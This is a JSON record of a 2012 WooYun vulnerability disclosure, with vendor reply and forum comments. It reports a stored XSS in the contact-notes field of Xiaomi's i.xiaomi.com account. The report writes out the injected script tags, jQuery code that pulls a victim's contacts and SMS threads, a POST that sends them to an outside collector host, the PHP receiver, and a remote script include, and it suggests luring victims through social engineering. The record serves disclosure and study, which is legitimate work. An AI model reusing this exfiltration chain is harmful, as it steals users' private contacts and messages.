{"id": 17979, "wybug_id": "wooyun-2012-09688", "wybug_title": "通过小米账户XSS窃取超私密资料，危害严重", "wybug_corp": "小米科技", "wybug_author": "Cp0204", "wybug_date": "2012-07-15 21:02", "wybug_open_date": "2012-08-29 21:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-08-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-29：\t细节向公众公开  简要描述： 通过小米账户XSS窃取用户超敏感信息 详细说明：  现在不是很流行一种功能叫摇摇手机分享联系人吗？故事从这里开始；情景假设：A：嘿，MAN，你也用小米手机？ B：当然了，小米手机杠杠的！A：我最近拿到了XX门主角的电话哦！看在朋友的份上…不过要到同步到电脑登陆i.xiaomi.com才能看到号码。B：好的！好的！于是，过后B屁颠屁颠的登陆i.xiaomi.com去看，结果什么也没有。与此同时，A在电脑的另一端收集到了B的小米账户名！手机联系人！手机短信！下面开正题，登陆小米账户，在右侧会显示联系人的详细资料，如图：\n\n可以看到是直接显示出来，而且对电话、邮件的格式没有进行过滤。为了保险，我们选一个能写大量字符的地方，没错，那就是备注！\n<Iframe src=\"http://www.baidu.com\"></iframe> <script>alert(/xss by cp0204/);</script>\n写入成功！\n\n谁说XSS价值不大，其实看你怎么利用罢了。试过抓包，但小米账户是https，抓包很困难，用浏览器就分析\n\n继续深入\n\n都抓出来，分别对应3个栏目，现在我们想办法收集这些数据可以看到它是这样的，其中37009121是我的小米ID，后面跟的参数不知道什么，不管有用没用，但都可以通过JS取到\nhttps://i.xiaomi.com/contacts/37009121/full?_dc=1342331522472&syncTag=0&limit=500\n返回：\n{\"result\":\"ok\",\"description\":\"成功\",\"data\":{\"content\":{\"9204442\":{\"content\":{\"id\":9204442,\"status\":\"custom\",\"tag\":10327278,\"organizations\":[{\"title\":\"领导\",\"company\":\"有关部门\"}],\"emails\":[{\"value\":\"Cp0204@qq.com\",\"type\":\"home\"}],\"phoneNumbers\":[{\"value\":\"123456\",\"type\":\"mobile\"}],\"displayName\":\"有关部门\",\"note\":\"<Iframe src=\\\"http://www.baidu.com\\\"><\\/iframe> \\n<script>alert(/xss by cp0204/);<\\/script>\"},\"spinyin\":\"ygbm\",\"type\":\"contact\",\"pinyin\":\"youguanbumen\"}},\"lastPage\":true,\"letterIndex\":{\"Y\":[9204442]},\"group\":[],\"syncTag\":10327278},\"code\":0}\n网站已引入了jquery，那我就方便多了，写js获取数据\n//取联系人result1 = getdata(\"/contacts/\"+mid+\"/full?syncTag=0\");//取短信result2 = getdata(\"/sms/\"+mid+\"/full/thread?syncTag=0&limit=20&_dc=1342338505981&readMode=older\");//全部result3 = getdata(\"/sms/\"+mid+\"/locked?syncTag=0&limit=20&_dc=1342338505981&readMode=older\");//收藏result4 = getdata(\"/sms/\"+mid+\"/deleted/thread??syncTag=0&limit=20&_dc=1342338505981&readMode=older\");//已删除function getdata(url) {\tvar data\t$.ajax({\t\turl: url,\t\tasync: false,\t\tsuccess: function(result){data = obj2str(result);},\t});\treturn data;}…………\n然后，收集\n$.post(\"http://cptimer.sinaapp.com/mi/mi.php?mid=\"+mid+\"&data=\"+data,{mid:mid,data:data}, function(result){\talert(result); //return mid data});\n顺便提一下，jq ajax是不可以跨域，但其实是可以提交，只是没有返回。所以这里post是可以的，mi.php\n<?$mid=$_REQUEST['mid'];$data=$_REQUEST['data'];echo \"小米ID：\".$_REQUEST[\"mid\"].\"\\n账户数据：\".$_REQUEST[\"data\"];?>\n如此一来，联系人、短信全收集，什么门也出来了有没有小白在备注里加上以下，做下试验，仅供学习…\n<script src=\"http://cptimer.sinaapp.com/mi/mi.js\"></script>\n================== 最后总结 ===================小白学习，大牛就见笑了。小小的XSS，也是大大的问题。很多人鄙视XSS，大概那些人只会弹个窗罢了。还有就是加上社工，怎么传那个联系人给别人。而且，有小米手机的可以测试一下通过短信箱能不能攻击，能的话就更简单了！发条xss短信，然后叫他上小米账户看…也是另外一个思路，没有小米手机测试不了。窃取这些东西还是很有价值的，你试想一下，你的联系人、短信全部泄露…特别一些重要人员，例如…有关部门的有关领导呃…顺便说一句，我没有小米手机、没有小米手机、没有小米手机~    漏洞证明：  \n\n我没有小米手机、没有小米手机、没有小米手机~    修复方案：  你比我牛   版权声明：转载请注明来源 Cp0204@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2012-07-16 12:20 厂商回复： 感谢上报，核实中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-15 21:15 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  真相是什么！    \n     2012-07-15 21:59 |    \t\t水 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 水)\t\t \n  @风萧萧 m2    \n     2012-07-15 22:02 |    \t\tliner \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:27        )\t\t \n  真相是小米的融资文件什么的某公司每次都了如执掌,楼主泄露机密了小心他们找你    \n     2012-07-15 22:12 |    \t\tClaud \t\t\t( 普通白帽子  |\t\t\t        Rank:161 漏洞数:18        | secmobi.com)\t\t \n  新上线的那个云短信功能？    \n     2012-07-15 23:15 |    \t\tCp0204 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | 著名艺术家)\t\t \n  @liner 你想太多了，是窃用户的，不是小米的，是你说的就好了。几斤手机～    \n     2012-07-16 01:55 |    \t\tCp0204 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | 著名艺术家)\t\t \n  这个是有针对性的，如果有联系人分享推送什么的，就更完了    \n     2012-07-16 09:14 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  坐等真相。    \n     2012-07-16 09:17 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  最近流行XSS？    \n     2012-08-25 21:04 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  Xss横跨全球    \n     2012-08-30 18:28 |    \t\t摩斯 \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:2        | 每天进步一点点！努力学习技术！)\t\t \n  哈哈。楼主想要手机啊    \n     2012-09-03 14:48 |    \t\tCp0204 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:4        | 著名艺术家)\t\t \n  @摩斯 可惜木有 = =!    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}